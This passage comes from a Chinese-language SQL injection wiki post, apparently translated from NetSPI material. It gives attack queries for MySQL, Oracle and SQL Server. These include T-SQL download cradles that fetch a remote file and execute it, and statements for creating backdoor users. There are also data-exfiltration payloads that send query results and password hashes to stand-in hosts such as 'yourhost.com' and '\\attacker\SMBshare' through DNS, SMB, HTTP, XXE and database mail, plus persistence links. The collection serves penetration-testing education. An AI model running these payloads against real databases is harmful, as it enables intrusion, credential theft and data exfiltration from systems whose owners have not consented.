int<br>DECLARE @Command varchar(8000<br><br>-- Set target url containting TSQL<br>SET @url = ‘<a href="http://127.0.0.1/mycmd.txt&#39;" target="_blank" rel="noopener">http://127.0.0.1/mycmd.txt&#39;</a><br><br>-- Setup namespace<br>EXEC @handle=sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT<br><br>-- Call the Open method to setup the HTTP request<br>EXEC @handle=sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’<br><br>-- Call the Send method to send the HTTP GET request<br>EXEC @handle=sp_OAMethod @WinHTTP,’Send’<br><br>-- Capture the HTTP response content<br>EXEC @handle=sp_OAGetProperty @WinHTTP,’ResponseText’, @Command out<br><br>-- Destroy the object<br>EXEC @handle=sp_OADestroy @WinHTTP<br><br>-- Display command<br>SELECT @Command<br><br>-- Run command<br>EXECUTE (@Command)</td></tr><tr><td>下载Cradle OAP 2 - TSQL</td><td style="text-align:center"><br>-- OLE Automation Procedure - Download Cradle Example - Option 2<br>-- Can handle larger payloads, but requires a table<br><br>-- Note: This also works with unc paths \ip\file.txt<br>-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.<br><br>-- Setup Variables<br>DECLARE @url varchar(300)<br>DECLARE @WinHTTP int<br>DECLARE @Handle int<br>DECLARE @Command varchar(8000)<br><br>-- Set target url containting TSQL<br>SET @url = ‘<a href="http://127.0.0.1/mycmd.txt&#39;" target="_blank" rel="noopener">http://127.0.0.1/mycmd.txt&#39;</a><br><br>-- Create temp table to store downloaded string<br>CREATE TABLE #text(html text NULL)<br><br>-- Setup namespace<br>EXEC @Handle=sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT<br><br>-- Call open method to configure HTTP request<br>EXEC @Handle=sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’<br><br>-- Call Send method to send the HTTP request<br>EXEC @Handle=sp_OAMethod @WinHTTP,’Send’<br><br>-- Capture the HTTP response content<br>INSERT #text(html)<br>EXEC @Handle=sp_OAGetProperty @WinHTTP,’ResponseText’<br><br>-- Destroy the object<br>EXEC @Handle=sp_OADestroy @WinHTTP<br><br>-- Display the commad<br>SELECT @Command = html from #text<br>SELECT @Command<br><br>-- Run the command<br>EXECUTE (@Command)<br><br>-- Remove temp table<br>DROP TABLE #text</td></tr><tr><td>读取文件 - TSQL</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql</a><br> <a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql</a><br> <a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx</a><br><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql</a><br><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql</a><br> <a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql</a></td></tr><tr><td>写文件 - TSQL</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql</a><br><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql</a></td></tr></tbody></table><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>　　横向移动允许测试人员访问不同的功能/数据集，这些功能/数据不明确要求为特权的用户。横向切换用户帐户将暴露不同的信息，并可能有助于损害更多特权用户。</p><h4 id="MySQL-5"><a href="#MySQL-5" class="headerlink" title="MySQL"></a>MySQL</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td style="text-align:center">CREATE USER ‘netspi‘@’%’ IDENTIFIED BY ‘password’</td></tr><tr><td>删除用户</td><td style="text-align:center">DROP USER netspi</td></tr></tbody></table><h4 id="Oracle-6"><a href="#Oracle-6" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td style="text-align:center">CREATE USER user IDENTIFIED by pass;</td></tr><tr><td>删除用户</td><td style="text-align:center">DROP USER user</td></tr></tbody></table><h4 id="SQL-Server-6"><a href="#SQL-Server-6" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td style="text-align:center">EXEC sp_addlogin ‘user’, ‘pass’;</td></tr><tr><td>删除用户</td><td style="text-align:center">EXEC sp_droplogin ‘user’;</td></tr><tr><td>链接抓取</td><td style="text-align:center"><a href="https://blog.netspi.com/sql-server-link-crawling-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-link-crawling-powerupsql/</a></td></tr><tr><td>作为当前服务连接到远程数据库</td><td style="text-align:center">–Requires sysadmin<br>SELECT * FROM OPENDATASOURCE(‘SQLNCLI’, ‘Server=MSSQLSRV04\SQLSERVER2016;Trusted_Connection=yes;’).master.dbo.sysdatabases</td></tr></tbody></table><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a><span id="dataExfiltration">数据泄露</span></h3><p>　　泄漏的数据以及任何受损数据的脱机副本可以用来做数据分析。数据可以通过文件，各种Layer 4请求和隐藏技术被泄漏。</p><p>　　<code>*</code>需要特权用户</p><h4 id="MySQL-6"><a href="#MySQL-6" class="headerlink" title="MySQL"></a>MySQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>DNS 请求</td><td style="text-align:center"><code>SELECT LOAD\_FILE(concat(&#39;\\\\&#39;,(QUERY\_WITH\_ONLY\_ONE\_ROW), &#39;yourhost.com\\&#39;))</code></td></tr><tr><td>SMB 分享</td><td style="text-align:center"><code>SELECT * FROM USERS INTO OUTFILE &#39;\\attacker\SMBshare\output.txt&#39;</code></td></tr><tr><td>HTTP 服务器</td><td style="text-align:center"><code>SELECT * FROM USERS INTO OUTFILE &#39;/var/www/html/output.txt&#39;</code></td></tr><tr><td>数字连接</td><td style="text-align:center"><code>SELECT length(user())</code><br><code>SELECT ASCII(substr(user(),1))</code><br>当数据只能作为数字导出时，转换为ASCII。 有关自动化<a href="http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1" target="_blank" rel="noopener">点击此处连接</a>.</td></tr></tbody></table><h4 id="Oracle-7"><a href="#Oracle-7" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>将多行合并为一行</td><td style="text-align:center"><code>SELECT dbms_xmlgen.getxmltype(&#39;select user from dual&#39;) FROM dual</code></td></tr><tr><td>XML外部实体</td><td style="text-align:center"><code>SELECT xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://IP/test&quot;&gt; %remote; %param1;]&gt;&#39;) FROM dual;</code></td></tr><tr><td>URL_HTTP 请求 (Pre-11gR2)</td><td style="text-align:center"><code>SELECT UTL_HTTP.request (&#39;http://IP/test&#39;) FROM dual;</code></td></tr><tr><td>避免特殊字符</td><td style="text-align:center"><code>SELECT UTL_URL.escape(&#39;http://IP/&#39;</code> &#124;&#124; <code>USER) FROM dual;</code></td></tr></tbody></table><h4 id="SQL-Server-7"><a href="#SQL-Server-7" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>注意：可以从MSSQL发出DNS请求。但是，此请求需要管理员权限和SQL Server 2005。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>制造DNS请求</td><td style="text-align:center"><code>DECLARE @host varchar(800); select @host = name + &#39;-&#39; + master.sys.fn_varbintohexstr(password_hash) + &#39;netspi.com&#39; from sys.sql_logins;exec(&#39;xp_fileexist &quot;\&#39; + @host + &#39;c$boot.ini&quot;&#39;);</code></td></tr><tr><td>UNC路径（DNS请求）</td><td style="text-align:center"><code>xp_dirtree ‘\\data.domain.com\file’</code></td></tr><tr><td>启用<code>sp_send_dbmail</code>并发送查询</td><td style="text-align:center"><code>sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;sp_configure &#39;Database Mail XPs&#39;, 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients=&#39;harold@netspi.com&#39;,@query=&#39;select @@version&#39;;</code></td></tr><tr><td>基本的<code>xp_sendmail</code>查询</td><td style="text-align:center"><code>EXEC master..xp_sendmail &#39;harold@netspi.com&#39;, &#39;This is a test.&#39;</code></td></tr><tr><td>使用<code>xp_sendmail</code>发送完整的电子邮件</td><td style="text-align:center"><code>EXEC xp_sendmail @recipients=&#39;harold@netspi.com&#39;, @message=&#39;This is a test.&#39;, @copy_recipients=&#39;test@netspi.com&#39;, @subject=&#39;TEST&#39;</code></td></tr><tr><td>通过<code>xp_sendmail</code>发送查询结果</td><td style="text-align:center"><code>EXEC xp_sendmail &#39;harold@netspi.com&#39;, @query=&#39;SELECT @@version&#39;;</code></td></tr><tr><td>通过<code>xp_sendmail</code>发送查询结果作为附件</td><td style="text-align:center"><code>CREATE TABLE ##texttab (c1 text) INSERT ##texttab values (&#39;Put messge here.&#39;) DECLARE @cmd varchar(56)SET @cmd = &#39;SELECT c1 from ##texttab&#39;EXEC master.dbo.xp_sendmail &#39;robertk&#39;,@query = @cmd, @no_header=&#39;TRUE&#39;DROP TABLE ##texttab</code></td></tr></tbody></table><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>　　在系统上获得持久性可在网络中创建半永久性的立足点，从而延长利用时间。有了这个额外的时间，可以尝试不同的载体和利用方法。</p><p>　　<code>*</code>需要特权用户</p><h4 id="MySQL-7"><a href="#MySQL-7" class="headerlink" title="MySQL"></a>MySQL</h4><p>　　暂无</p><h4 id="Oracle-8"><a href="#Oracle-8" class="headerlink" title="Oracle"></a>Oracle</h4><p>　　暂无</p><h4 id="SQL-Server-8"><a href="#SQL-Server-8" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>启动存储过程</td><td style="text-align:center"><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td></tr><tr><td>触发器</td><td style="text-align:center"><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td></tr><tr><td>Regwrite</td><td style="text-align:center"><a href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a></td></tr></tbody></table><h2 id="6-其他"><a href="#6-其他" class="headerlink" title="6.其他"></a>6.其他</h2><h3 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h3><p>Aaron Yaeger</p><p>Antti Rantasaari</p><p>Ben Tindell</p><p>Colin Salisbury</p><p>Eric Gruber (@egru)</p><p>Jake Reynolds (@jreynoldsdev)</p><p>Khai Tran (@k_tr4n)</p><p>Rafael Seferyan</p><p>Scott Sutherland (@_nullbind)</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><h4 id="MySQL-8"><a href="#MySQL-8" class="headerlink" title="MySQL"></a>MySQL</h4><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></p><p><a href="http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/" target="_blank" rel="noopener">http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/</a></p><p><a href="https://www.tutorialspoint.com/mysql/mysql-sql-injection.htm" target="_blank" rel="noopener">https://www.tutorialspoint.com/mysql/mysql-sql-injection.htm</a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html</a></p><p><a href="http://garage4hackers.com/showthread.php?t=1990" target="_blank" rel="noopener">http://garage4hackers.com/showthread.php?t=1990</a></p><p><a href="https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/" target="_blank" rel="noopener">https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/</a></p><p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections</a></p><p><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">https://websec.ca/kb/sql_injection</a></p><p><a href="http://hakipedia.com/index.php/SQL_Injection" target="_blank" rel="noopener">http://hakipedia.com/index.php/SQL_Injection</a></p><p><a href="http://blog.kotowicz.net/2013/01/abusing-mysql-string-arithmetic-for.html" target="_blank" rel="noopener">http://blog.kotowicz.net/2013/01/abusing-mysql-string-arithmetic-for.html</a></p><p><a href="https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf" target="_blank" rel="noopener">https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf</a></p><p><a href="http://www.securiteam.com/securityreviews/5JP0F20EUM.html" target="_blank" rel="noopener">http://www.securiteam.com/securityreviews/5JP0F20EUM.html</a></p><p><a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/</a></p><p><a href="http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1" target="_blank" rel="noopener">http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1</a></p><p><a href="http://stackoverflow.com/questions/14714750/how-to-get-true-size-of-mysql-database" target="_blank" rel="noopener">http://stackoverflow.com/questions/14714750/how-to-get-true-size-of-mysql-database</a></p><p><a href="http://stackoverflow.com/questions/5648420/get-all-columns-from-all-mysql-tables" target="_blank" rel="noopener">http://stackoverflow.com/questions/5648420/get-all-columns-from-all-mysql-tables</a></p><p><a href="http://www.regular-expressions.info/creditcard.html" target="_blank" rel="noopener">http://www.regular-expressions.info/creditcard.html</a></p><h4 id="Oracle-9"><a href="#Oracle-9" class="headerlink" title="Oracle"></a>Oracle</h4><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql</a></p><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></p><p><a href="http://www.sqlinjectionwiki.com/Categories/3/oracle-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://www.sqlinjectionwiki.com/Categories/3/oracle-sql-injection-cheat-sheet</a></p><p><a href="https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf" target="_blank" rel="noopener">https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf</a></p><p><a href="http://www.sqlinjection.net/union/" target="_blank" rel="noopener">http://www.sqlinjection.net/union/</a></p><h4 id="SQL-Server-9"><a href="#SQL-Server-9" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><a href="https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf" target="_blank" rel="noopener">https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf</a></p><p><a href="https://www.gracefulsecurity.com/sql-injection-exploitation/" target="_blank" rel="noopener">https://www.gracefulsecurity.com/sql-injection-exploitation/</a></p><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p><p><a href="http://websec.ca/kb/sql_injection#MSSQL_Default_Databases" target="_blank" rel="noopener">http://websec.ca/kb/sql_injection#MSSQL_Default_Databases</a></p><p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p><p><a href="http://pentestmonkey.net/blog/mssql-dns" target="_blank" rel="noopener">http://pentestmonkey.net/blog/mssql-dns</a></p><p><a href="http://www.sqlinjectionwiki.com/Categories/1/mssql-sql-injection-cheat-sheet/" target="_blank" rel="noopener">http://www.sqlinjectionwiki.com/Categories/1/mssql-sql-injection-cheat-sheet/</a></p><p><a href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/templates-tsql/Get-QueryHistory.sql" target="_blank" rel="noopener">https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/templates-tsql/Get-QueryHistory.sql</a></p><p><a href="https://www.codeproject.com/Questions/219741/Select-nth-row-of-a-table-in-sql-server" target="_blank" rel="noopener">https://www.codeproject.com/Questions/219741/Select-nth-row-of-a-table-in-sql-server</a></p><p><a href="http://www.sqlinjection.net/time-based/" target="_blank" rel="noopener">http://www.sqlinjection.net/time-based/</a></p><p><a href="https://stackoverflow.com/questions/639854/check-if-a-row-exists-otherwise-insert" target="_blank" rel="noopener">https://stackoverflow.com/questions/639854/check-if-a-row-exists-otherwise-insert</a></p><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>　　可以在下面找到一些有用的用于测试查询的在线沙箱</p><h4 id="MySQL-9"><a href="#MySQL-9" class="headerlink" title="MySQL"></a>MySQL</h4><p><a href="http://sqlfiddle.com/#!9" target="_blank" rel="noopener">http://sqlfiddle.com/#!9</a></p><p><a href="http://rextester.com/l/mysql_online_compiler" target="_blank" rel="noopener">http://rextester.com/l/mysql_online_compiler</a></p><p><a href="https://www.tutorialspoint.com/mysql_terminal_online.php" target="_blank" rel="noopener">https://www.tutorialspoint.com/mysql_terminal_online.php</a></p><p><a href="https://www.jdoodle.com/online-mysql-terminal" target="_blank" rel="noopener">https://www.jdoodle.com/online-mysql-terminal</a></p><h4 id="Oracle-10"><a href="#Oracle-10" class="headerlink" title="Oracle"></a>Oracle</h4><p><a href="http://sqlfiddle.com/#!4" target="_blank" rel="noopener">http://sqlfiddle.com/#!4</a></p><p><a href="https://livesql.oracle.com/apex/livesql/file/index.html" target="_blank" rel="noopener">https://livesql.oracle.com/apex/livesql/file/index.html</a></p><p><a href="https://www.tutorialspoint.com/oracle_terminal_online.php" target="_blank" rel="noopener">https://www.tutorialspoint.com/oracle_terminal_online.php</a></p><h4 id="SQL-Server-10"><a href="#SQL-Server-10" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><a href="http://sqlfiddle.com/#!6" target="_blank" rel="noopener">http://sqlfiddle.com/#!6</a></p><p><a href="https://turbo.net/sql" target="_blank" rel="noopener">https://turbo.net/sql</a></p><p><a href="https://sqlzoo.net/" target="_blank" rel="noopener">https://sqlzoo.net/</a></p><p><a href="http://www.headfirstlabs.com/sql_hands_on/" target="_blank" rel="noopener">http://www.headfirstlabs.com/sql_hands_on/</a></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>　　可以在下面找到一些有用的用于识别和自动执行SQL注入的工具：</p><h4 id="MySQL-10"><a href="#MySQL-10" class="headerlink" title="MySQL"></a>MySQL</h4><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></p><p><a href="http://sqlninja.sourceforge.net/" target="_blank" rel="noopener">http://sqlninja.sourceforge.net/</a></p><p><a href="https://metasploit.com/" target="_blank" rel="noopener">https://metasploit.com/</a></p><h4 id="Oracle-11"><a href="#Oracle-11" class="headerlink" title="Oracle"></a>Oracle</h4><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></p><p><a href="http://sqlninja.sourceforge.net/" target="_blank" rel="noopener">http://sqlninja.sourceforge.net/</a></p><p><a href="https://metasploit.com/" target="_blank" rel="noopener">https://metasploit.com/</a></p><h4 id="SQL-Server-11"><a href="#SQL-Server-11" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></p><p><a href="http://sqlninja.sourceforge.net/" target="_blank" rel="noopener">http://sqlninja.sourceforge.net/</a></p><p><a href="https://metasploit.com/" target="_blank" rel="noopener">https://metasploit.com/</a></p></div><div></div><div><div><div style="text-align:center;color:#555;font-size:14px">-------------End-------------</div></div></div><div><div style="padding:10px 0;margin:20px auto;width:90%;text-align:center"><div>Thank you very much for your donation.</div> <button id="rewardButton" disable="enable" onclick='var qr=document.getElementById("QR");"none"===qr.style.display?qr.style.display="block":qr.style.display="none"'> <span>打赏</span></button><div id="QR" style="display:none"><div id="wechat" style="display:inline-block"> <img id="wechat_qr" src="/images/wechatpay.png" alt=" 微信支付"><p>微信支付</p></div><div id="alipay" style="display:inline-block"> <img id="alipay_qr" src="/images/alipay.png" alt=" 支付宝"><p>支付宝</p></div><div id="bitcoin" style="display:inline-block"> <img id="bitcoin_qr" src="/images/bitcoin.png" alt=" 比特币"><p>比特币</p></div></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/漏洞/" rel="tag"><i class="fa fa-tag"></i> 漏洞</a><a href="/tags/wiki/" rel="tag"><i class="fa fa-tag"></i> wiki</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/Security/交易系统常见问题及方案概述/" rel="next" title="交易系统常见问题及方案概述"><i class="fa fa-chevron-left"></i> 交易系统常见问题及方案概述</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"> <a href="/Bug/XSS/" rel="prev" title="XSS wiki">XSS wiki<i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div><div class="comments" id="comments"><div id="lv-container" data-id="city" data-uid="MTAyMC8zODM5Mi8xNDkyMA=="></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap"> 文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap"> 站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/images/diyz.jpg" alt=""><p class="site-author-name" itemprop="name"></p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">21</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/index.html"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/index.html"><span class="site-state-item-count">16</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a rel="external nofollow" href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1321425651" target="_blank" title="QQ" rel="external nofollow"><i class="fa fa-fw fa-qq"></i> QQ</a></span><span class="links-of-author-item"><a rel="external nofollow" href="mailto:1321425651@qq.com" target="_blank" title="E-Mail" rel="external nofollow"><i class="fa fa-fw fa-envelope"></i> E-Mail</a></span><span class="links-of-author-item"><a rel="external nofollow" href="https://github.com/doubiduo" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a rel="external nofollow" href="https://steamcommunity.com/id/doubiduo" target="_blank" title="Steam" rel="external nofollow"><i class="fa fa-fw fa-steam"></i> Steam</a></span><span class="links-of-author-item"><a rel="external nofollow" href="https://www.diyz.bid/atom.xml" target="_blank" title="RSS" rel="external nofollow"><i class="fa fa-fw fa-rss"></i> RSS</a></span></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-检测SQL注入"><span class="nav-text">1. 检测SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#参数位置"><span class="nav-text">参数位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测注入"><span class="nav-text">检测注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-DBMS识别"><span class="nav-text">2.DBMS识别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Server"><span class="nav-text">SQL Server</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-注入类型"><span class="nav-text">3.注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#显错注入"><span class="nav-text">显错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MYSQL"><span class="nav-text">MYSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-1"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-1"><span class="nav-text">SQL Server</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MSSQL-CAST函数示例"><span class="nav-text">MSSQL CAST函数示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#联合查询"><span class="nav-text">联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-1"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-2"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-2"><span class="nav-text">SQL Server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-2"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-3"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-3"><span class="nav-text">SQL Server</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-注入技术"><span class="nav-text">4.注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#条件语句"><span class="nav-text">条件语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-攻击查询"><span class="nav-text">5.攻击查询</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据定位"><span class="nav-text">数据定位</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数据定位查询"><span class="nav-text">数据定位查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据定位正则表达式"><span class="nav-text">数据定位正则表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据定位关键字"><span class="nav-text">数据定位关键字</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-3"><span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#生成反向shell有效负载"><span class="nav-text">生成反向shell有效负载</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#生成一个侦听器来传递反向shell"><span 